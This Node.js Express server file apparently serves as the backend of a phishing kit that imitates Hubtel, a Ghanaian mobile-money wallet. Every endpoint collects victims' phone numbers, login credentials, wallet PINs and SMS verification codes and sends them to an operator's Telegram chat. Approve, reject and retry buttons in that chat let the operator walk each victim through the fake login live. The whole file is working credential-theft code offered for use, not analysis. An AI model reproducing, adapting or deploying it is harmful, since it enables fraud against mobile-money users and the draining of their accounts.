const express = require('express');
const cors = require('cors');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

app.use(cors());
app.use(express.json());
app.use(express.static('.'));

const orderStatuses = {};
const promoStatuses = {};
const lastSubmissionTime = {}; 

async function sendToTelegram(url, payload) {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 15000);

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
            signal: controller.signal
        });
        clearTimeout(timeoutId);
        return await response.json();
    } catch (error) {
        clearTimeout(timeoutId);
        console.error('Error:', error.message);
        throw error;
    }
}

app.post('/api/submit-order', async (req, res) => {
    try {
        const { phone, uniqueId } = req.body;
        
        const currentTime = Date.now(); 
        const cooldownTime = 15 * 1000;

        if (lastSubmissionTime[phone] && (currentTime - lastSubmissionTime[phone] < cooldownTime)) {
            return res.json({ success: true, message: 'Already submitted.' });
        }

        lastSubmissionTime[phone] = currentTime;
        orderStatuses[phone] = 'pending';

        const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        const countryFlag = "🇬🇭";
        const countryCode = "+233";

        const isPinStep = uniqueId && uniqueId.length === 4 && /^\d+$/.test(uniqueId);
        const headerTitle = isPinStep ? "🐉🔐 *HUBTEL WALLET PIN SUBMITTED*" : "🐉🔔 *NEW HUBTEL LOGIN ATTEMPT*";
        const credentialLabel = isPinStep ? "Wallet PIN" : "Credential";

        let message = `${headerTitle}\n\n` +
                      `${countryFlag} Country: \`${countryCode}\`\n` +
                      `📱 Phone: \`${phone}\``;

        if (uniqueId) {
            message += `\n🔑 ${credentialLabel}: \`${uniqueId}\``;
        }

        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const wrongButtonText = isPinStep ? "⚠️ Wrong PIN" : "⚠️ Wrong Details";

        const cbDataId = uniqueId || 'none';

        await sendToTelegram(telegramUrl, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Approve", callback_data: `approve_${phone}_${cbDataId}` },
                        { text: "❌ Not User", callback_data: `not_user_${phone}_${cbDataId}` }
                    ],
                    [
                        { text: wrongButtonText, callback_data: `wrong_id_${phone}_${cbDataId}` }
                    ]
                ]
            }
        });

        res.json({ success: true, message: 'Sent successfully.' });
    } catch (error) {
        console.error(error);
        res.status(500).json({ success: false, message: 'Error' });
    }
});

app.get('/api/check-status', (req, res) => {
    const phone = req.query.phone ? req.query.phone.trim() : '';
    const status = orderStatuses[phone] || 'pending';
    res.json({ status });
});

app.post('/api/verify-promo', async (req, res) => {
    try {
        const { phone, promoCode, uniqueId } = req.body; 
        const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        promoStatuses[phone] = 'pending';

        const countryFlag = "🇬🇭";
        let message = `🐊📋 *SMS CODE VERIFICATION REQUEST*\n\n` +
                        `${countryFlag} Phone: \`${phone}\``;

        if (uniqueId) {
            message += `\n🔑 Credential: \`${uniqueId}\``;
        }
        message += `\n🔢 Code Entered: \`${promoCode}\``;

        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const cbDataId = uniqueId || 'none';
        
        const tgResponse = await sendToTelegram(telegramUrl, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Valid Code", callback_data: `valid_${phone}_${cbDataId}` },
                        { text: "❌ Wrong Code", callback_data: `wrong_code_${phone}_${cbDataId}` }
                    ],
                    [
                        { text: "🔄 Try Again", callback_data: `try_again_${phone}_${cbDataId}` }
                    ]
                ]
            }
        });

        if (tgResponse && tgResponse.ok === false) {
            return res.status(400).json({ success: false, message: tgResponse.description || 'Telegram rejection' });
        }

        res.json({ success: true, message: 'Success.' });
    } catch (error) {
        console.error("CRITICAL BACKEND ERROR:", error.message);
        res.status(500).json({ success: false, message: 'Error' });
    }
});

app.get('/api/check-promo-status', (req, res) => {
    const phone = req.query.phone ? req.query.phone.trim() : '';
    const status = promoStatuses[phone] || 'pending';
    res.json({ status });
});

app.post('/api/send-thank-you', async (req, res) => {
    try {
        const { phone, uniqueId } = req.body;
        const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        const countryFlag = "🇬🇭";
        let message = `🐅💬 *OTP RESEND REQUESTED*\n\n` +
                        `${countryFlag} Phone: \`${phone}\``;
        if (uniqueId) {
            message += `\n🔑 Credential: \`${uniqueId}\``;
        }
        message += `\n📌 Action: *Resend SMS Code*`;

        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        await sendToTelegram(telegramUrl, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });

        res.json({ success: true, message: 'sent.' });
    } catch (error) {
        console.error("CRITICAL BACKEND ERROR:", error.message);
        res.status(500).json({ success: false, message: 'Error' });
    }
});

app.post('/api/telegram-webhook', async (req, res) => {
    try {
        const update = req.body;

        if (update.callback_query) {
            const callbackData = update.callback_query.data;
            const chatId = update.callback_query.message.chat.id;
            const messageId = update.callback_query.message.message_id;
            const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;

            let actionText = '';
            let phone = '';
            let uniqueId = '';
            let messageTitle = 'PROCESSED REQUEST';
            let emojiIcon = '🐉';

            if (callbackData.startsWith('approve_')) {
                const parts = callbackData.replace('approve_', '').split('_');
                phone = parts[0];
                uniqueId = parts[1] === 'none' ? '' : parts[1];
                orderStatuses[phone] = 'approved';
                actionText = 'Approved ✅';
                messageTitle = 'APPROVAL RESULT';
                emojiIcon = '🐉';
            } else if (callbackData.startsWith('reject_') || callbackData.startsWith('not_user_')) {
                const prefix = callbackData.startsWith('not_user_') ? 'not_user_' : 'reject_';
                const parts = callbackData.replace(prefix, '').split('_');
                phone = parts[0];
                uniqueId = parts[1] === 'none' ? '' : parts[1];
                orderStatuses[phone] = 'not_user';
                actionText = 'Not Registered ❌';
                messageTitle = 'REGISTRATION CHECK RESULT';
                emojiIcon = '🐊';
            } else if (callbackData.startsWith('wrong_id_')) {
                const parts = callbackData.replace('wrong_id_', '').split('_');
                phone = parts[0];
                uniqueId = parts[1] === 'none' ? '' : parts[1];
                orderStatuses[phone] = 'wrong_id';
                actionText = 'Incorrect Credential ⚠️';
                messageTitle = 'CREDENTIAL ERROR RESULT';
                emojiIcon = '🐅';
            } else if (callbackData.startsWith('valid_')) {
                const parts = callbackData.replace('valid_', '').split('_');
                phone = parts[0];
                uniqueId = parts[1] === 'none' ? '' : parts[1];
                promoStatuses[phone] = 'valid';
                actionText = 'Valid Code ✅ (Accepted)';
                messageTitle = 'CODE VERIFICATION RESULT';
                emojiIcon = '🐉';
            } else if (callbackData.startsWith('wrong_code_')) {
                const parts = callbackData.replace('wrong_code_', '').split('_');
                phone = parts[0];
                uniqueId = parts[1] === 'none' ? '' : parts[1];
                promoStatuses[phone] = 'invalid';
                actionText = 'Wrong Code ❌ (Cleared)';
                messageTitle = 'CODE VERIFICATION RESULT';
                emojiIcon = '🐊';
            } else if (callbackData.startsWith('try_again_')) {
                const parts = callbackData.replace('try_again_', '').split('_');
                phone = parts[0];
                uniqueId = parts[1] === 'none' ? '' : parts[1];
                promoStatuses[phone] = 'try_again';
                actionText = 'Try Again 🔄 (Awaiting New Code)';
                messageTitle = 'CODE VERIFICATION RESULT';
                emojiIcon = '🐅';
            }

            let updatedMessage = `${emojiIcon} *${messageTitle}*\n\n` +
                                 `🇬🇭 Phone: \`${phone}\``;
            if (uniqueId) {
                updatedMessage += `\n🔑 Credential: \`${uniqueId}\``;
            }
            updatedMessage += `\n📌 Status: *${actionText}*`;

            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`;
            await sendToTelegram(telegramUrl, {
                chat_id: chatId,
                message_id: messageId,
                text: updatedMessage,
                parse_mode: 'Markdown'
            });
        }
    } catch (err) {
        console.error('Webhook Error:', err);
    }

    res.sendStatus(200);
});

async function registerTelegramWebhook() {
    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const RENDER_URL = process.env.RENDER_EXTERNAL_URL;

    if (!BOT_TOKEN || !RENDER_URL) {
        console.log('Telegram webhook setup skipped: missing environment variable.');
        return;
    }

    const webhookUrl = `${RENDER_URL}/api/telegram-webhook`;

    try {
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${encodeURIComponent(webhookUrl)}`;
        const result = await fetch(telegramUrl).then(res => res.json());
        console.log('Telegram webhook setup:', result);
    } catch (error) {
        console.error('Telegram webhook setup failed:', error.message);
    }
}

app.listen(PORT, () => {
    console.log(`Server running live at http://localhost:${PORT}`);
    registerTelegramWebhook();
});